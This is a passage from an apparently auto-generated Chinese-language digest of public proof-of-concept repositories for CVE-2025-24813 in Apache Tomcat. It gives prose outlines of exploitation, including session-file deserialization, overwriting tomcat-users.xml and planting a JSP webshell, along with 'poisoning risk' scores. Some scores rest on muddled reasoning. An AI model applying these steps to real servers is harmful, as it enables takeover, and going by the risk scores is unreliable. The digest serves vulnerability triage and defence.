**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

